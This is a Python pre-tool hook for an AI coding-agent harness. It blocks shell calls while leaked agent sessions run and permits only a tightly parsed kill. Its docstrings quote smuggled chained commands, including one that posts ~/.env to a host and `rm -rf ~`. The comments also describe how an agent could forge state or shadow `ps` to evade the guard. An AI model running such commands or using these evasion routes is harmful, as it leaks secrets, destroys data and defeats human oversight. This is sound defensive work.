#!/usr/bin/env python3
"""Refuse the next Bash call while an agent session this box leaked is alive.

On 2026-09-10 a dispatcher wrapped `claude -p` in `timeout 900`, and the Bash
tool wrapped the dispatcher in a shorter timeout of its own. When the outer one
fired it killed the wrapper; the inner `timeout` was reparented to init and kept
running. That happened six times in half an hour. Each orphan held a live API
session, spent Patrick's credits unsupervised, and competed with the runs that
followed -- which skewed the A/B measurements being taken at the time, so
several conclusions drawn that afternoon rested on polluted numbers.

A note saying "sweep orphans after a timeout" was already written down, by me,
before any of it. It caught none of the six. Patrick: *"the 'rules' you write
yourself are worse than worthless. They're actively harmful, as they give me a
sense of security, and then you just breeze right past."* So this is a guard,
for the reason commit_message_substitution_guard gives: a promise a guard can
keep and a habit cannot.

WHY PreToolUse, WHEN THE LEAK HAPPENS AFTER A CALL
    PostToolUse cannot refuse anything -- the tool has already run, and exit 2
    there only shows the agent a warning it may read past. That is the advisory
    note again in a hook's clothes. Detection therefore lands on the NEXT Bash
    call, where refusal is real: nothing further happens until the leak is gone.

WHY IT KEEPS NO STATE
    The first draft of this file cached a per-session baseline of already-orphaned
    pids under ~/.claude. An agent with a shell can write that file, and writing
    one pid into it would have retired this guard silently. Any on-disk baseline
    is forgeable by the process being guarded, so there is none: the test is a
    property of the running process itself, read fresh every time.

WHAT IT REFUSES
    A process of this user that is (a) reparented -- its parent is init or a
    subreaper -- and (b) an AGENT SESSION, by its own command line. Both halves
    matter. Reparenting alone would flag the dashboard and the board watcher,
    which are meant to outlive their launchers; the command match alone would
    flag every healthy agent this session is legitimately running.

HOW IT CLEARS
    By killing them, which is the only correct action, and the refusal prints
    the exact command. A rule the right actor cannot satisfy is a deadlock, so
    that kill is allowed while the block stands. It is remediation, not an
    override: it does not let the refused command through, it removes the
    condition. There is no env var, no comment, and no token that does.
"""

import json
import os
import re
import shlex
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _repo_context import statements  # noqa: E402,I001

BLOCK = 2
ALLOW = 0

# Absolute paths, tried in order. `ps` resolved through PATH would be shadowable
# by anything an agent can drop in ~/.local/bin, and a guard whose eyes can be
# replaced by the thing it watches is not a guard.
PS_BINARIES = ("/bin/ps", "/usr/bin/ps")

# `euser` and the WHOLE table, not `-u <me>`. The reaper that adopts an orphan
# is frequently owned by root -- on WSL it is `/init`, pid 885, running as root
# -- and a user-filtered listing cannot see it. A guard that cannot see the
# reaper can never recognise anything it adopted: a decoy orphan on 2026-09-10
# was allowed through for exactly this reason, which is the whole class of leak
# this file exists for. So the table is read entire, and ownership is applied
# when deciding what to FLAG, not when deciding what to look at.
PS_FORMAT = "euser=,pid=,ppid=,etimes=,args="

# The leak class this exists for: a Claude Code session, or the `timeout` that
# was supposed to bound one, still running with nobody holding its hand. Matched
# on the command line because that is a property of the process itself -- there
# is no file here for an agent to edit.
# `(?:^|[\s/])` -- start of the line, a space, or a path separator. The first
# draft used `(?:^|/)` and matched nothing at all: in `timeout 900 claude -p`
# the word `claude` is preceded by a SPACE, so every one of the six real leaks
# read as clean. The tests below are built from those six precisely so a regex
# that matches nothing cannot pass.
START = r"(?:^|[\s/])"
AGENT_SESSION = re.compile(
    rf"{START}claude\b(?=.*\s-p\b)"          # claude ... -p ...
    rf"|{START}timeout\b.*{START}claude\b"   # timeout N claude ...
    rf"|{START}glm-agent\b",                 # the harness's GLM dispatcher
)

REAPER_NAMES = ("systemd", "init", "launchd")


def run_ps():
    """Rows of (pid, ppid, etimes, args) for this user.

    Raises if `ps` cannot be found or run. The caller refuses in that case
    rather than allowing: "not installed, skipping" exiting 0 is failure
    wearing a success mask, and it is also the shape an agent would engineer
    if allowing were on the table.
    """
    last = None
    for binary in PS_BINARIES:
        if not os.path.exists(binary):
            continue
        try:
            done = subprocess.run(
                [binary, "-eo", PS_FORMAT],
                capture_output=True, text=True, timeout=10)
        except Exception as exc:
            last = exc
            continue
        if done.returncode == 0:
            return parse_ps(done.stdout)
        last = RuntimeError(f"{binary} exited {done.returncode}")
    raise RuntimeError(f"no usable ps ({last})")


def parse_ps(text):
    rows = []
    for line in text.splitlines():
        parts = line.split(None, 4)
        if len(parts) < 5:
            continue
        try:
            rows.append({"user": parts[0], "pid": int(parts[1]),
                         "ppid": int(parts[2]), "etimes": int(parts[3]),
                         "args": parts[4]})
        except ValueError:
            continue
    return rows


def reaper_pids(rows):
    """The pids that adopt orphans: init, plus any session-level subreaper.

    pid 1 is not the only answer. Under WSL and under `systemd --user` an orphan
    is adopted by a manager with a pid in the thousands -- the six leaked on
    2026-09-10 all showed a ppid of 885, and a guard that knew only about pid 1
    would have called every one of them correctly parented.
    """
    reapers = {1}
    for row in rows:
        argv = row["args"].split()
        base = os.path.basename(argv[0]) if argv else ""
        if base in REAPER_NAMES or base.startswith("systemd"):
            reapers.add(row["pid"])
    return reapers


def current_user():
    try:
        import pwd
        return pwd.getpwuid(os.getuid()).pw_name
    except Exception:
        return os.environ.get("USER") or ""


def orphans(rows, user=None):
    """Leaked agent sessions of `user`. Pure, so testable without leaking one.

    Reapers are found across the WHOLE table -- they are usually root's -- and
    ownership is applied only to what gets flagged. Nothing another user is
    running is this session's business.
    """
    me = current_user() if user is None else user
    reapers = reaper_pids(rows)
    return [r for r in rows
            if r["ppid"] in reapers
            and r["pid"] not in reapers
            and r.get("user", me) == me
            and AGENT_SESSION.search(r["args"])]


SIGNALS = {"1", "2", "9", "15"}
SIGNAL_NAMES = {"HUP", "INT", "KILL", "TERM", "SIGHUP", "SIGINT",
                "SIGKILL", "SIGTERM"}


def is_sweep(command, pids):
    """True when `command` is a kill aimed only at the pids this guard named.

    Narrow on purpose. "Anything containing kill" would pass `kill -9 -1`; the
    command that clears the block is permitted and nothing else is.

    CE-2.18, and the reason this is a token allowlist rather than a regex. The
    first version matched KILL at the START of the string and then checked every
    integer anywhere in it. So the one command this guard PUTS IN AN AGENT'S
    HANDS carried whatever was chained after it:

        kill <pid> && curl <host> -d @~/.env    -> accepted as a sweep
        kill <pid>; rm -rf ~                    -> accepted as a sweep
        kill <pid> | tee /tmp/x                 -> accepted as a sweep

    CSO blocked a release on it. That is worse than an ordinary hole: the guard
    prints the command, so it was not merely permitting the smuggler, it was
    dictating it.

    Splitting on statements is necessary and NOT sufficient. A bare `&` is not a
    statement separator to the shared parser -- `kill <pid> & curl ...` is one
    statement -- and neither is a redirect or a command substitution. So after
    confirming there is exactly one statement, every token must be something a
    sweep is allowed to contain: the kill itself, a signal, or a flagged pid.
    Anything else at all, including `&`, `>` and `$(`, fails the allowlist
    without this having to enumerate the metacharacters that exist.
    """
    if not pids:
        return False
    parts = list(statements(command or ""))
    if len(parts) != 1:
        return False

    try:
        tokens = shlex.split(parts[0])
    except ValueError:          # unbalanced quotes: cannot reason about it
        return False
    if tokens and tokens[0] == "sudo":
        tokens = tokens[1:]
    if not tokens or os.path.basename(tokens[0]) not in ("kill", "pkill"):
        return False

    flagged = {str(p) for p in pids}
    named_a_pid = False
    rest = tokens[1:]

    # EXACTLY ONE signal spec, and only as the first argument.
    #
    # Third round on this function, and each previous grammar was defeated by
    # the same wildcard moving one token:
    #
    #   shape-only allowlist   kill <pid> -1        -1 read as a signal anywhere
    #   options-run-first      kill -9 -1 <pid>     -1 read as a SECOND signal
    #
    # bash's kill takes a single leading signal spec and then treats every
    # remaining token as a PID, dash or not. It does not accept a run of
    # options the way getopt-style commands do, so a grammar that allows one is
    # strictly more permissive than the thing it is guarding. pid -1 is the
    # wildcard: every process the sender may signal.
    #
    # Verified against bash with the null signal, which tests permission
    # without delivering anything: `kill -0 -HUP <pid>` answers "arguments must
    # be process or job IDs" -- the second dash token is being read as a pid,
    # not as an option.
    if rest and rest[0].startswith("-") and rest[0] != "--":
        body = rest[0][1:]
        if body not in SIGNALS and body.upper() not in SIGNAL_NAMES:
            return False
        rest = rest[1:]
    if rest and rest[0] == "--":
        rest = rest[1:]

    # Everything left is a pid operand, and must be one this guard itself
    # named. A dash token can therefore never survive here, which is the
    # property that actually matters: `-1`, `-0` and `-<pid>` are all process
    # GROUPS or wildcards, and none of them is a pid this guard flagged.
    for token in rest:
        if token in flagged:
            named_a_pid = True
            continue
        return False

    return named_a_pid


def refusal(found):
    pids = " ".join(str(r["pid"]) for r in found)
    lines = [
        ("BLOCKED: an agent session is still running after whatever launched "
         "it exited."),
        "",
        ("These are reparented to init -- nothing is supervising them, and an "
         "orphaned session keeps"),
        ("spending money and competing with the runs that follow. Six of them "
         "skewed an afternoon of"),
        "measurements on 2026-09-10 before anyone noticed.",
        "",
    ]
    for row in found:
        mins, secs = divmod(row["etimes"], 60)
        lines.append(f"  pid {row['pid']:<8} {mins}m{secs:02d}s  {row['args'][:88]}")
    lines += [
        "",
        "Sweep them, then carry on:",
        f"  kill {pids}",
        "",
        ("That kill is allowed while this block stands; nothing else is. It is "
         "not an override --"),
        ("it removes the condition rather than excusing it, and there is no "
         "variable or comment"),
        "that does the latter.",
    ]
    return "\n".join(lines)


def deny(reason):
    # Both protocols. A plain-text refusal is ADVISORY in a `claude -p`
    # subprocess -- measured 2026-09-10, when every guard in the harness was
    # being read past because its output did not begin with `{`.
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "deny",
            "permissionDecisionReason": reason,
        }
    }))
    print(reason, file=sys.stderr)
    return BLOCK


def main():
    try:
        data = json.load(sys.stdin)
    except Exception:
        return ALLOW

    if data.get("tool_name") != "Bash":
        return ALLOW

    try:
        rows = run_ps()
    except Exception as exc:
        return deny(
            f"BLOCKED: this guard cannot see the process table ({exc}).\n\n"
            "It refuses rather than allowing, because 'cannot check, carrying "
            "on' is\n"
            "indistinguishable from 'checked and fine' -- and is the state an "
            "agent would\n"
            "engineer if allowing were on the table. Install or repair `ps`.")

    found = orphans(rows)
    if not found:
        return ALLOW

    command = (data.get("tool_input") or {}).get("command", "")
    if is_sweep(command, [r["pid"] for r in found]):
        return ALLOW

    return deny(refusal(found))


if __name__ == "__main__":
    sys.exit(main())
